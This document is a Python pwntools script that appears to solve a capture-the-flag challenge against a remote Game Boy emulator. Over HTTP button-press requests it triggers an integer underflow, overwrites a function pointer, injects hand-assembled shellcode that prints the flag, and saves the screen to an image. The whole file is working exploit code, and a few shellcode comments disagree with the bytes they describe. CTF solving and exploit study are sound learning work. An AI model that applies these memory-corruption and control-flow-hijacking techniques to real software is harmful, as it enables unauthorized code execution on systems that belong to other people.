from pwn import *
import requests
import shutil

BUTTON_RIGHT_ARROW  = 0x001
BUTTON_LEFT_ARROW   = 0x002
BUTTON_UP_ARROW     = 0x004
BUTTON_DOWN_ARROW   = 0x008
BUTTON_A            = 0x010
BUTTON_B            = 0x020
BUTTON_SELECT       = 0x040
BUTTON_START        = 0x080
BUTTON_RESET        = 0x100

PORT = 42551
HOST = "instances.challenge-ecw.fr"

def press_button(button: int):
    """
    Send a button press to the remote emulator
    """

    requests.get(f"http://{HOST}:{PORT}/setState?state={button}")
    requests.get(f"http://{HOST}:{PORT}/setState?state=0")

def save_frame(path: str):
    """
    Save the current frame to a PNG image
    """
    response = requests.get(f"http://{HOST}:{PORT}/render", stream=True)
    response.raw.decode_content = True

    with open(path, "wb") as f:
        shutil.copyfileobj(response.raw, f)

    print(f"[*] Frame saved at '{path}'")

jmp = lambda addr : bytes([0xC3]) + p16(addr)

def write_byte(byte: int):
    if byte > 0xff:
        raise "failure"
    
    if byte > 0x80:
        for _ in range(0xff - byte):
            press_button(BUTTON_DOWN_ARROW)
    else:
        for _ in range(byte):
            press_button(BUTTON_UP_ARROW)

def get_shellcode():
    FLAG_ADDR = 0x6FA
    BNPRINT_ADDR = 0x10C0
    DELAY_ADDR = 0x139B

    arg_0 = 1
    arg_1 = 4
    arg_2 = 0x12
    arg_3 = FLAG_ADDR

    sc = b""
    sc += bytes([0x11]) + p16(arg_3)                        # ld de, arg_3
    sc += bytes([0xD5])                                     # push de
    sc += bytes([0x21]) + p16((arg_2 << 8) | arg_1)         # ld hl, (arg_2 << 8) | arg_1
    sc += bytes([0xE5])                                     # push hl
    sc += bytes([0x3E]) + p8(arg_0)                         # ld a, arg_0
    sc += bytes([0xF5])                                     # push af
    sc += bytes([0x33])                                     # inc sp
    sc += bytes([0xCD]) + p16(BNPRINT_ADDR)                 # call BNPRINT_ADDR
    sc += bytes([0xE8])                                     # ret pe
    sc += bytes([0x05])                                     # dec b
    sc += bytes([0x11]) + p16(2000)                         # ld de, 10000
    sc += bytes([0xCD]) + p16(DELAY_ADDR)                   # call DELAY_ADDR
    sc += bytes([0x07])                                     # rcla
    sc += bytes([0xC9])                                     # ret

    return sc

def main():
    # Reset the gameboy
    press_button(BUTTON_RESET)

    # Add "Right" instruction
    press_button(BUTTON_A)
    press_button(BUTTON_RIGHT_ARROW)

    print("[+] Trigger underflow of insn_count")

    for _ in range(4):
        press_button(BUTTON_SELECT)

    print("[+] Decrement insn_rpt[0] for game execution")
    
    press_button(BUTTON_DOWN_ARROW)

    print("[+] Align on function pointer index at insn_ids[0]")

    for _ in range(0x10):
        press_button(BUTTON_RIGHT_ARROW)
    
    print("[+] Writing fake function pointer index at insn_ids[0]")
    write_byte(0x1C)

    print("[+] Align on function pointer value at insn_funcs[0x1C]")

    for _ in range(0x20):
        press_button(BUTTON_RIGHT_ARROW)

    print("[+] Writing fake function pointer at insn_funcs[0x1C]")

    write_byte(0xF0)
    press_button(BUTTON_RIGHT_ARROW)
    write_byte(0xC0)
    
    for _ in range(6):
        press_button(BUTTON_RIGHT_ARROW)

    sc = get_shellcode()

    for idx in range(len(sc)):
        print("[+] Writing shellcode byte (%d/%d)" % (idx, len(sc)))
        write_byte(sc[idx])
        press_button(BUTTON_RIGHT_ARROW)

    press_button(BUTTON_START)

    save_frame("./flag.png")

main()